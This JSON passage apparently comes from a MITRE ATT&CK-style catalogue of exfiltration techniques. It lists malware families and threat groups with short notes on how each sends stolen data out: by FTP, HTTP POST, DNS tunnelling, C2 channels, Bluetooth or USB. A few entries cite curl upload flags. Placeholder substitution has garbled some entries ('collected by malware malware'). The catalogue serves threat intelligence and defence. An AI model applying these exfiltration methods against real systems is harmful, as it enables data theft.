                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has routines for exfiltration over SMTP, FTP, and HTTP.[2][3][4]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name>'s backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.[5]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used FTP to exfiltrate files (separately from the C2 channel).[6]"
                    },
                    "S0190": {
                        "ID": "S0190",
                        "Name": "BITSAdmin",
                        "Description": "<name> can be used to create BITS Jobs to upload files from a compromised host.[7]"
                    },
                    "S0252": {
                        "ID": "S0252",
                        "Name": "Brave Prince",
                        "Description": "Some <name> variants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.[8]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.[9]"
                    },
                    "S0335": {
                        "ID": "S0335",
                        "Name": "Carbon",
                        "Description": "<name> uses HTTP to send data to the C2 server.[10]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> can upload collected data and files to an FTP server.[11]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "<name> can send victim data via FTP with credentials hardcoded in the script.[12]"
                    },
                    "S0107": {
                        "ID": "S0107",
                        "Name": "Cherry Picker",
                        "Description": "<name> exfiltrates files over FTP.[13]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> has used the curl --upload-file command to exfiltrate data over HTTP.[14]"
                    },
                    "S0212": {
                        "ID": "S0212",
                        "Name": "CORALDECK",
                        "Description": "<name> has exfiltrated data in HTTP POST headers.[15]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.[16]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> exfiltrates logs of its execution stored in the /tmp folder over FTP using the curl command.[17]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has sent stolen payment card data to remote servers via HTTP POSTs.[18]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used FTP to exfiltrate collected data.[19]"
                    },
                    "S0095": {
                        "ID": "S0095",
                        "Name": "ftp",
                        "Description": "<name> may be used to exfiltrate data separate from the main command and control protocol.[20][21]"
                    },
                    "S0487": {
                        "ID": "S0487",
                        "Name": "Kessel",
                        "Description": "<name> can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.[22]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has used FTP to exfiltrate reconnaissance data out.[23]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.[24][25]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has exfiltrated data over FTP separately from its primary C2 channel over DNS.[26]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has used ftp for exfiltration.[27]"
                    },
                    "S1040": {
                        "ID": "S1040",
                        "Name": "Rclone",
                        "Description": "<name> can exfiltrate data over FTP or HTTP, including HTTP via WebDAV.[28]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.[29]"
                    },
                    "S1124": {
                        "ID": "S1124",
                        "Name": "SocGholish",
                        "Description": "<name> can exfiltrate data directly to its C2 domain via HTTP.[30]"
                    },
                    "G0076": {
                        "ID": "G0076",
                        "Name": "Thrip",
                        "Description": "<name> has used WinSCP to exfiltrate data from a targeted organization over FTP.[31]"
                    },
                    "S1116": {
                        "ID": "S1116",
                        "Name": "WARPWIRE",
                        "Description": "<name> can send captured credentials to C2 via HTTP GET or POST requests.[32][33]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.[34]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has exfiltrated victim information using FTP.[35][36]"
                    }
                }
            }
        },
        "tactic": "Exfiltration",
        "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP.[1] On macOS and Linux curl may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.[2]Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.",
        "Procedure": {
            "S0677": {
                "ID": "S0677",
                "Name": "AADInternals",
                "Description": "malware can directly download cloud user data such as OneDrive files.[3]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware uses the curl -s -L -o command to exfiltrate archived data to a URL.[2]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol.[4]"
            },
            "S0503": {
                "ID": "S0503",
                "Name": "FrameworkPOS",
                "Description": "malware can use DNS tunneling for exfiltration of credit card data.[5]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware connects to a predefined domain on port 443 to exfil gathered information.[6]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware can exfiltrate credentials over the network via UDP.[7]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has used a .NET tool named dog.exe to exiltrate information over an e-mail account.[8]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has sent locally staged files with collected credentials to C2 servers using cURL.[9]"
            }
        }
    },
    "T1041": {
        "ttp_name": "Exfiltration Over C2 Channel",
        "ttp_id": "T1041",
        "href": "/techniques/T1041",
        "tactic": "Exfiltration",
        "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
        "Procedure": {
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware exfiltrates data over the same channel used for C2.[1]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has sent victim data to its C2 servers.[2]"
            },
            "S0584": {
                "ID": "S0584",
                "Name": "AppleJeus",
                "Description": "malware has exfiltrated collected host information to a C2 server.[3]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can exfiltrate files via the C2 channel.[4]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that exfiltrates data over the C2 channel.[5]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware's backdoor has exfiltrated data using the already opened channel with its C&C server.[6]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has exfiltrated stolen victim data through C2 communications.[7]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware exfiltrates collected information from its r1.log file to the external C2 server. [8]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware has exfiltrated data over the C2 channel.[9]"
            },
            "S1029": {
                "ID": "S1029",
                "Name": "AuTo Stealer",
                "Description": "malware can exfiltrate data over actor-controlled C2 servers via HTTP or TCP.[10]"
            },
            "S0031": {
                "ID": "S0031",
                "Name": "BACKSPACE",
                "Description": "Adversaries can direct malware to upload files to the C2 Server.[11]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can exfiltrate data over the C2 channel.[12][13]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware can upload files from a victim's machine over the C2 channel.[14]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware exfiltrates data over its C2 channel.[15]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has added the exfiltrated data to the URL over the C2 channel.[16]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware has sent user and system information to a C2 server via HTTP POST requests.[17][18]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware has exfiltrated data over its C2 channel.[19]"
            },
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware uploads files and data from a compromised host over the existing C2 channel.[20]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can send collected data in JSON format to C2.[21]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used its Cloudflare services C2 channels for data exfiltration.[22]"
            },
            "S0077": {
                "ID": "S0077",
                "Name": "CallMe",
                "Description": "malware exfiltrates data to its C2 server over the same protocol as C2 communications.[23]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.[24]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has exfiltrated data via HTTP to already established C2 servers.[25][26]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware can upload files over the C2 channel.[27]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.[28]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used Cobalt Strike C2 beacons for data exfiltration.[29]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can exfiltrate collected data via C2.[30]"
            },
            "G0142": {
                "ID": "G0142",
                "Name": "Confucius",
                "Description": "malware has exfiltrated stolen files to its C2 server.[31]"
            },
            "S1024": {
                "ID": "S1024",
                "Name": "CreepySnail",
                "Description": "malware can connect to C2 for data exfiltration.[32]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can exfiltrate stolen information over its C2.[33]"
            },
            "S0538": {
                "ID": "S0538",
                "Name": "Crutch",
                "Description": "malware can exfiltrate data over the primary C2 channel (Dropbox HTTP API).[34]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware has the ability to upload exfiltrated files to a C2 server.[35]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware uses existing command and control channels to retrieve captured cryptocurrency wallet credentials.[36]"
            },
            "S1021": {
                "ID": "S1021",
                "Name": "DnsSystem",
                "Description": "malware can exfiltrate collected data to its C2 server.[37]"
            },
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware has used Ngrok to establish C2 and exfiltrate data.[38]"
            },
            "S0502": {
                "ID": "S0502",
                "Name": "Drovorub",
                "Description": "malware can exfiltrate files over C2 infrastructure.[39]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware has exfiltrated data to the C2 server.[40]"
            },
            "S0024": {
                "ID": "S0024",
                "Name": "Dyre",
                "Description": "malware has the ability to send information staged on a compromised host externally to C2.[41]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware can exfiltrate SSH credentials through custom DNS queries.[42]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has exfiltrated data over its C2 channel.[43][44]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can send data gathered from a target through the command and control channel.[45][46]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware can upload files over the C2 channel from the infected host.[47]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has exfiltrated data to the C2 server.[48]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware has sent data collected from a compromised host to its C2 servers.[49]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware can remotely exfiltrate sensitive information from a compromised AD FS server.[50]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors collected information via Empire, which sent the data back to the adversary's C2.[46]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can execute commands, including gathering user information, and send the results to C2.[51]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware used Web shells and HTRAN for C2 and to exfiltrate data.[52]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "A malware file stealer can transfer collected files to a hardcoded C2 server.[53]"
            },
            "S0493": {
                "ID": "S0493",
                "Name": "GoldenSpy",
                "Description": "malware has exfiltrated host environment information to an external C2 domain via port 9006.[54]"
            },
            "S0588": {
                "ID": "S0588",
                "Name": "GoldMax",
                "Description": "malware can exfiltrate files over the existing C2 channel.[55][56]"
            },
            "S0477": {
                "ID": "S0477",
                "Name": "Goopy",
                "Description": "malware has the ability to exfiltrate data over the Microsoft Outlook C2 channel.[57]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can send data it retrieves to the C2 server.[58]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware has sent data related to a compromise host over its C2 channel.[59]"
            },
            "S0391": {
                "ID": "S0391",
                "Name": "HAWKBALL",
                "Description": "malware has sent system information and files over the C2 channel.[60]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware exfiltrated data over its C2 channel.[61]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has used its C2 channel to exfiltrate data.[62]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to download files from the infected host to the command and control (C2) server.[63]"
            },
            "S1022": {
                "ID": "S1022",
                "Name": "IceApple",
                "Description": "malware's Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2.[64]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has uploaded a file containing debugger logs, network information and system information to the C2.[65]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.[66]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.[67]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware has exfiltrated information gathered from the infected system to the C2 server.[68]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can send data from the victim host through a DNS C2 channel.[69]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware can exfiltrate collected information from the host to the C2 server.[70]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has exfiltrated data over its C2 channel.[71][72]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has sent data and files to its C2 server.[73][74][75]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware has exfiltrated collected data to its C2 via POST requests.[76]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has exfiltrated data and files over a C2 channel through its various tools and malware.[77][78][79]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has exfiltrated data over its C2 channel.[80]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware exfiltrates data over its email C2 channel.[81]"
            },
            "S0680": {
                "ID": "S0680",
                "Name": "LitePower",
                "Description": "malware can send collected data, including screenshots, over its C2 channel.[82]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.[83]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has used malware that exfiltrates stolen data to its C2 server.[84]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware's collected data is exfiltrated over the same channel used for C2.[85]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware exfiltrates data from a supplied path over its C2 channel.[86]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can send network system data and files to its C2 server.[87]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can exfiltrate locally stored data via its C2.[88]"
            },
            "S0459": {
                "ID": "S0459",
                "Name": "MechaFlounder",
                "Description": "malware has the ability to send the compromised user's account name and hostname within a URL to C2.[89]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can upload collected files and data to its C2 server.[90]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware can send the data it collects to the C2 server.[91]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware has transmitted collected files and data to its C2 server.[92]"
            },
            "S0083": {
                "ID": "S0083",
                "Name": "Misdat",
                "Description": "malware has uploaded files and data to its C2 servers.[92]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware can sends the collected financial data to the C2 server.[93][94]"
            },
            "S0079": {
                "ID": "S0079",
                "Name": "MobileOrder",
                "Description": "malware exfiltrates data to its C2 server over the same protocol as C2 communications.[23]"
            },
            "S1026": {
                "ID": "S1026",
                "Name": "Mongall",
                "Description": "malware can upload files and information from a compromised host to its C2 server.[95]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used C2 infrastructure to receive exfiltrated data.[96]"
            },
            "S0034": {
                "ID": "S0034",
                "Name": "NETEAGLE",
                "Description": "malware is capable of reading files over the C2 channel.[11]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can use SMTP and DNS for file exfiltration and C2.[97]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware has used HTTP to receive stolen information from the infected machine.[98]"
            },
            "S0340": {
                "ID": "S0340",
                "Name": "Octopus",
                "Description": "malware has uploaded stolen files and data from a victim's machine over its C2 channel.[99]"
            },
            "S0439": {
                "ID": "S0439",
                "Name": "Okrum",
                "Description": "Data exfiltration is done by malware using the already opened channel with the C2 server.[100]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware can upload files from the victim's machine to its C2 server.[101]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers.[102]"
            },
            "C0006": {
                "ID": "C0006",
                "Name": "Operation Honeybee",
                "Description": "During malware, the threat actors uploaded stolen files to their C2 servers.[103]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used the XServer backdoor to exfiltrate data.[104]"
            },
            "S1017": {
                "ID": "S1017",
                "Name": "OutSteel",
                "Description": "malware can upload files from a compromised host over its C2 channel.[105]"
            },
            "S1050": {
                "ID": "S1050",
                "Name": "PcShare",
                "Description": "malware can upload files and information from a compromised host to its C2 servers.[51]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "malware can execute the command code do_upload to send files to C2.[106]"
            },
            "S1031": {
                "ID": "S1031",
                "Name": "PingPull",
                "Description": "malware has the ability to exfiltrate stolen victim data through its C2 channel.[107]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has exfiltrated data over the C2 channel.[108]"
            },
            "S0441": {
                "ID": "S0441",
                "Name": "PowerShower",
                "Description": "malware has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.[109]"
            },
            "S0238": {
                "ID": "S0238",
                "Name": "Proxysvc",
                "Description": "malware performs data exfiltration over the control server channel using a custom protocol.[110]"
            },
            "S0078": {
                "ID": "S0078",
                "Name": "Psylo",
                "Description": "malware exfiltrates data to its C2 server over the same protocol as C2 communications.[23]"
            },
            "S0147": {
                "ID": "S0147",
                "Name": "Pteranodon",
                "Description": "malware exfiltrates screenshot files to its C2 server.[53]"
            },
            "S0192": {
                "ID": "S0192",
                "Name": "Pupy",
                "Description": "malware can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.[111]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can send stolen information to C2 nodes including passwords, accounts, and emails.[112]"
            },
            "S0495": {
                "ID": "S0495",
                "Name": "RDAT",
                "Description": "malware can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.[113]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware performs exfiltration over BITSAdmin, which is also used for the C2 channel.[114]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware can exfiltrate host and malware information to C2 servers.[115]"
            },
            "S0448": {
                "ID": "S0448",
                "Name": "Rising Sun",
                "Description": "malware can send data gathered from the infected machine via HTTP POST request to the C2.[116]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can send collected files back over same C2 channel.[117]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "malware sends device and other collected data back to the C2 using the established C2 channels over TCP. [118]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "malware has uploaded data and files from a compromised host to its C2 servers.[92]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has sent system information to its C2 server using HTTP.[119]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has sent collected data from a compromised host to its C2 servers.[49]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.[120]"
            },
            "S1089": {
                "ID": "S1089",
                "Name": "SharpDisco",
                "Description": "malware can load a plugin to exfiltrate stolen files to SMB shares also used in C2.[97]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware sent generated reports to the C2 via HTTP POST requests.[121]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware has exfiltrated data over its C2 channel.[122]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can transfer files from an infected host to the C2 server.[123]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware can exfiltrate files from the victim using the download command.[124]"
            },
            "S0533": {
                "ID": "S0533",
                "Name": "SLOTHFULMEDIA",
                "Description": "malware has sent system information to a C2 server via HTTP and HTTPS POST requests.[125]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware has exfiltrated data to its C2 server.[126]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware has uploaded collected data and files from a compromised host to its C2 server.[127]"
            },
            "S0543": {
                "ID": "S0543",
                "Name": "Spark",
                "Description": "malware has exfiltrated data over the C2 channel.[128]"
            },
            "S1030": {
                "ID": "S1030",
                "Name": "Squirrelwaffle",
                "Description": "malware has exfiltrated victim data using HTTP POST requests to its C2 servers.[129]"
            },
            "S1037": {
                "ID": "S1037",
                "Name": "STARWHALE",
                "Description": "malware can exfiltrate collected data to its C2 servers.[130]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "After data is collected by malware malware, it is exfiltrated over the existing C2 channel.[131]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can send data and files from a compromised host to its C2 server.[132]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware can exfiltrate collected documents through C2 channels.[133][134]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware sends compromised victim information via HTTP.[135]"
            },
            "S1042": {
                "ID": "S1042",
                "Name": "SUGARDUMP",
                "Description": "malware has sent stolen credentials and other data to its C2 server.[136]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can send collected data in JSON format to its C2 server.[137]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware has exfiltrated data over its C2 channel.[138]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to send collected files over its C2.[139]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware exfiltrates targeted file extensions in the /Users/ folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.[140][141]"
            },
            "S0671": {
                "ID": "S0671",
                "Name": "Tomiris",
                "Description": "malware can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.[142]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware can send victim data to an actor-controlled C2 server.[143]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware can send information about the compromised host and upload data to a hardcoded C2 server.[144][145]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used HTTP POSTs to exfil gathered information.[146][147][148]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has the ability to exfiltrate data over the C2 channel.[149][150][151]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can send collected victim data to its C2 server.[152]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.[153][154]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can exfiltrate files from an infected machine to its C2 server.[155]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware exfiltrates data stolen from a system over its C2 channel.[156]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware has exfiltrated data to the designated C2 server using HTTP POST requests.[157][158]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has exfiltrated files via the Dropbox API C2.[159]"
            },
            "S0086": {
                "ID": "S0086",
                "Name": "ZLib",
                "Description": "malware has sent data and files from a compromised host to its C2 servers.[92]"
            }
        }
    },
    "T1011": {
        "ttp_name": "Exfiltration Over Other Network Medium",
        "ttp_id": "T1011",
        "href": "/techniques/T1011",
        "subtechnique": {
            "001": {
                "name": "Exfiltration Over Bluetooth",
                "href": "/techniques/T1011/001",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "Procedure": {
                    "S0143": {
                        "ID": "S0143",
                        "Name": "Flame",
                        "Description": "<name> has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity.[1]"
                    }
                }
            }
        },
        "tactic": "Exfiltration",
        "description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
        "Procedure": {}
    },
    "T1052": {
        "ttp_name": "Exfiltration Over Physical Medium",
        "ttp_id": "T1052",
        "href": "/techniques/T1052",
        "subtechnique": {
            "001": {
                "name": "Exfiltration over USB",
                "href": "/techniques/T1052/001",
                "description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
                "Procedure": {
                    "S0092": {
                        "ID": "S0092",
                        "Name": "Agent.btz",
                        "Description": "<name> creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.[1]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has a feature to copy files from every drive onto a removable drive in a hidden folder.[2][3]"
                    },
                    "G0129": {
                        "ID": "G0129",
